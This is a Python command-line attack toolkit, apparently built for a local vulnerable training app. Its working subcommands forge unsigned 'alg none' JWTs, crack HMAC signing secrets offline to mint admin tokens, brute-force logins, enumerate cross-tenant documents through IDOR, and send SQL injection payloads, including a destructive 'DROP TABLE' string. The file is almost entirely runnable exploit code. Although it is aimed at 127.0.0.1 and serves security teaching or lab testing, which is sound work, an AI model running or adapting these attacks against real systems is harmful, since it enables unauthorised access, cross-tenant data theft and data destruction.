"""
BreachSentinel attack toolkit — CLI for exercising the vulnerabilities in
api/app.py against a running instance. For use against the local target only.

Subcommands:
  jwt-none      Forge an unsigned ("alg: none") token and use it for privilege escalation.
  jwt-crack     Offline: recover the HMAC signing secret for a captured token from a wordlist.
  brute-login   Online: brute-force a user's password against /login.
  idor          Enumerate documents across tenants the caller's token does not own.
  sqli          Probe /search with classic SQL injection payloads.
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys

import jwt
import requests

DEFAULT_URL = "http://127.0.0.1:5000"


def b64url_decode(segment):
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def attack_jwt_none(args):
    print("[*] Forging an unsigned JWT (alg=none) claiming admin / tenant 0 ...")
    forged = jwt.encode(
        {"sub": 0, "username": "admin", "tenant_id": 0, "role": "admin"},
        key="",
        algorithm="none",
    )
    print(f"[*] Forged token: {forged}")

    resp = requests.get(
        f"{args.url}/tenants/0/documents",
        headers={"Authorization": f"Bearer {forged}"},
    )
    print(f"[*] GET /tenants/0/documents -> {resp.status_code}")
    print(json.dumps(resp.json(), indent=2))
    if resp.status_code == 200:
        print("[+] Signature bypass worked - read tenant 0 (admin) documents with no valid signature.")


def attack_jwt_crack(args):
    print(f"[*] Attempting to recover the signing secret for token from '{args.wordlist}' (offline)...")
    header_b64, payload_b64, sig_b64 = args.token.split(".")
    signing_input = f"{header_b64}.{payload_b64}".encode()
    target_sig = b64url_decode(sig_b64)

    found = None
    with open(args.wordlist, encoding="utf-8") as f:
        for line in f:
            candidate = line.strip()
            if not candidate:
                continue
            digest = hmac.new(candidate.encode(), signing_input, hashlib.sha256).digest()
            if hmac.compare_digest(digest, target_sig):
                found = candidate
                break

    if not found:
        print("[-] Secret not found in wordlist.")
        return

    print(f"[+] Recovered signing secret: '{found}'")
    payload = json.loads(b64url_decode(payload_b64))
    print(f"[*] Original payload: {payload}")

    payload["role"] = "admin"
    payload["tenant_id"] = 0
    forged = jwt.encode(payload, found, algorithm="HS256")
    print(f"[+] Forged admin token using the cracked secret: {forged}")

    resp = requests.get(
        f"{args.url}/tenants/0/documents",
        headers={"Authorization": f"Bearer {forged}"},
    )
    print(f"[*] GET /tenants/0/documents with forged token -> {resp.status_code}")
    print(json.dumps(resp.json(), indent=2))


def attack_brute_login(args):
    print(f"[*] Brute-forcing password for user '{args.username}' using '{args.wordlist}' ...")
    with open(args.wordlist, encoding="utf-8") as f:
        candidates = [line.strip() for line in f if line.strip()]

    for i, candidate in enumerate(candidates, start=1):
        resp = requests.post(
            f"{args.url}/login",
            json={"username": args.username, "password": candidate},
        )
        status = "OK" if resp.status_code == 200 else "fail"
        print(f"  [{i}/{len(candidates)}] trying '{candidate}' -> {resp.status_code} ({status})")
        if resp.status_code == 200:
            print(f"[+] Password found: '{candidate}'")
            print(f"[+] Token: {resp.json()['token']}")
            return
    print("[-] Password not found in wordlist.")


def attack_idor(args):
    print(f"[*] Enumerating tenants 0-{args.max_tenant} / docs 1-{args.max_doc} using caller's token ...")
    hits = []
    for tenant_id in range(0, args.max_tenant + 1):
        for doc_id in range(1, args.max_doc + 1):
            resp = requests.get(
                f"{args.url}/tenants/{tenant_id}/documents/{doc_id}",
                headers={"Authorization": f"Bearer {args.token}"},
            )
            if resp.status_code == 200:
                hits.append((tenant_id, doc_id, resp.json()))

    print(f"[*] Accessible documents outside the caller's own tenant:")
    for tenant_id, doc_id, doc in hits:
        print(f"  tenant={tenant_id} doc={doc_id} -> {doc['title']}")
    if hits:
        print(f"[+] IDOR confirmed - read {len(hits)} document(s) via tenant IDs not owned by this token.")


SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT id, tenant_id, title FROM documents --",
    "nonexistent' OR 1=1 --",
    "'; DROP TABLE documents; --",
]


def attack_sqli(args):
    print("[*] Probing /search with SQL injection payloads ...")
    for payload in SQLI_PAYLOADS:
        resp = requests.get(f"{args.url}/search", params={"q": payload})
        print(f"  payload={payload!r} -> {resp.status_code}, {len(resp.json()) if resp.status_code == 200 else 0} rows")


def main():
    parser = argparse.ArgumentParser(description="BreachSentinel attack toolkit")
    parser.add_argument("--url", default=DEFAULT_URL)
    sub = parser.add_subparsers(dest="command", required=True)

    sub.add_parser("jwt-none", help="Forge an alg=none token").set_defaults(func=attack_jwt_none)

    p = sub.add_parser("jwt-crack", help="Crack a token's signing secret offline")
    p.add_argument("--token", required=True)
    p.add_argument("--wordlist", default="attacks/wordlist.txt")
    p.set_defaults(func=attack_jwt_crack)

    p = sub.add_parser("brute-login", help="Brute-force a user's login password")
    p.add_argument("--username", required=True)
    p.add_argument("--wordlist", default="attacks/wordlist.txt")
    p.set_defaults(func=attack_brute_login)

    p = sub.add_parser("idor", help="Enumerate cross-tenant documents")
    p.add_argument("--token", required=True)
    p.add_argument("--max-tenant", type=int, default=3)
    p.add_argument("--max-doc", type=int, default=6)
    p.set_defaults(func=attack_idor)

    sub.add_parser("sqli", help="Probe /search for SQL injection").set_defaults(func=attack_sqli)

    args = parser.parse_args()
    args.func(args)


if __name__ == "__main__":
    sys.exit(main())
